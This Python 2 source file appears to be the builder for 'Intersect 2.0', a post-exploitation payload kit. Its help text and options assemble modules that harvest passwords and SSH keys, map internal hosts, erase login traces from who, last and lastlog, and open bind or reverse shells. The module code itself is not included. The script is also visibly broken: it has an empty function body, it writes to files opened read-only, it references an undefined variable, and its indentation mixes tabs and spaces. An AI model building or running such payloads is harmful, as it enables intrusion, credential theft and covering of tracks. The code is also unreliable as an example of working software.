#!/usr/bin/python

# Creation Utility

import os, sys
import string
import shutil
import getopt

global EndLines
global Network
global Bind
global Reverse
global Credentials
global LAN
global Scrub
global Daemon
global OSInfo
global Tar
global Extras
global Template


Network = open("Functions/Network.fnc")
Bind = open("Functions/Bind.fnc")
Reverse = open("Functions/Reverse.fnc")
Credentials = open("Functions/Credentials.fnc")
LAN = open("Functions/LAN.fnc")
Scrub = open("Functions/Scrub.fnc")
Daemon = open("Functions/Daemon.fnc")
OSInfo = open("Functions/OSInfo.fnc")
Tar = open("Functions/Tar.fnc")
Extras = open("Functions/Extras.fnc")
Template = open("Template.py")


EndLines = '''environment()
if __name__ == "__main__":
    if len(sys.argv) <=1:
        usage()
    main(sys.argv[1:])'''

def usage():

   __author__ = "ohdae"
   __version__ = "version 1.0"
   __website__ = "http://bindshell.it.cx"
   
   print("=====================================================")                                                                    
   print("       intersect 2.0 | custom creation utility       ")
   print("                "+__version__+"                      ")
   print("               "+__author__+" | "+__website__)
   print("=====================================================")
   print("This utility allows you to create your own custom Intersect2.0 payload.")
   print("By selecting any of the options below, those functions will be added into a new file built just for you")
   print("\nFunctions:")
   print("  -d --daemon         runs as a background process")
   print("  -o --os-info        gathers basic OS and user information")
   print("  -n --network        gathers network and connection information")
   print("  -l --live-hosts     finds live hosts and maps the internal LAN")
   print("  -c --credentials    collect passwords, usernames, SSH keys, etc")
   print("  -e --extras         find installed apps and other important stuff")
   print("  -t --tar            create tar archive of any task reports")
   print("  -s --scrub          hides user precense from who, last and lastlog")
   print("  -b --bind           creates TCP bindshell on port 443")
   print("  -r --reverse        creates TCP reverse shell to a listener")
   print("  -p --plugin         add your own custom function")  
   print("  -h --help           show this help menu\n")
   print("usage: ./Create.py --network --extras --scrub")
   print("       Output: A custom Intersect 2.0 script has been built using the features you selected!")
   print("       The new script is ready to use and has been saved as Intersect2-Custom.py. Enjoy!") 

def environment():
    CurrentDir = os.getcwd()
    if os.geteuid() != 0:
        print("[*] This script must be executed as root. We need root to read and write files during the Intersect creation process.")
        sys.exit(0)
    if os.path.exists("Template.py") is True:
        shutil.copy2("Template.py", "Intersect-Custom.py")
    elif not os.path.exists("Template.py") is True:
        print("[*] Cannot locate 'template.py'. Make sure this file is in the same directory that you are running CreateUtil from.")

def addOptions():
    
    

def combineFeatures():
    if os.path.exists("Intersect-Custom.py") is True:
        print("[!] Intersect-Custom.py all ready exists. If you are trying to create another custom payload, please move or rename the current Intersect-Custom.py file and try again.")
    if os.path.exists("Intersect-Custom.py") is False:
        new = open("Intersect-Custom.py", "a")
    
    for lines in function1.readlines():
        new.write(lines)

    new.write(EndLines)
    function1.close()
    new.close()

def main(argv):
    try:
        opts, args = getopt.getopt(argv, "dhtonlcesbrp", ["daemon", "help", "tar", "os-info", "network", "live hosts", "credentials", "extras", "scrub", "bind", "reverse","plugin"])
    except getopt.GetoptError, err:
        print str(err) 
        usage()
    for o, a in opts:
        if o in ("-d", "--daemon"):
            Template
            Daemon
            for lines in Daemon.readlines():
                Template.write(lines)
	    print("[+] Daemon function successfully added!")
            Daemon.close()                
        elif o in ("-h", "--help"):
            usage()
	    sys.exit(2)	
        elif o in ("-t", "--tar"):
            Template
	    Tar
            for lines in Tar.readlines():
                Template.write(lines)
	    print("[+] Tar function successfully added!")
            Tar.close()
        elif o in ("-o", "--os-info"):
            Template
	    OSInfo
            for lines in OSInfo.readlines():
                Template.write(lines)
	    print("[+] OSInfo function successfully added!")
            OSInfo.close()
        elif o in ("-n", "--network"):
             Template
	     Network
             for lines in Network.readlines():
                 Template.write(lines)
	     print("[+] Network function successfully added!")
             Network.close()
        elif o in ("-l", "--live-hosts"):
             Template
             LAN
             for lines in LAN.readlines():
                 Template.write(lines)
	     print("[+] LAN function successfully added!")
             LAN.close()
        elif o in ("-c", "--credentials"):
             Template
	     Credentials
             for lines in Credentials.readlines():
                 Template.write(lines)
	     print("[+] Credentials function successfully added!")
             Credentials.close() 
        elif o in ("-e", "--extras"): 
             Template
             Extras
             for lines in Extras.readlines():
                 Template.write(lines)	    
	     print("[+] Extras function successfully added!")
             Extras.close()
        elif o in ("-s", "--scrub"):
	     Template
             Scrub
             for lines in Scrub.readlines():
                 Template.write(lines)
	     print("[+] Scrub function successfully added!")
             Scrub.close()   
        elif o in ("-b", "--bind"):
             Template
             Bind
             for lines in Bind.readlines():
                 Template.write(lines)
	     print("[+] Bindshell function successfully added!")
             Bind.close()
        elif o in ("-r", "--reverse"):
             Template
             Reverse
             for lines in Reverse.readlines():
                 Template.write(lines)
	     print("[+] Reverse shell function successfully added!")
             Reverse.close()
        elif o in ("-p", "--plugin"):
             Template
             File = sys.argv[1:]
             Plugin = open(File)
             for lines in Plugin.readlines():
                 Template.write(lines)
	     print("[+] %s function successfully added!" % File)
             Plugin.close()
        else:
            assert False, "unhandled option"
    sys.exit(2)
  
environment()
if __name__ == "__main__":
    if len(sys.argv) <=1:
        usage()
    main(sys.argv[1:])



    
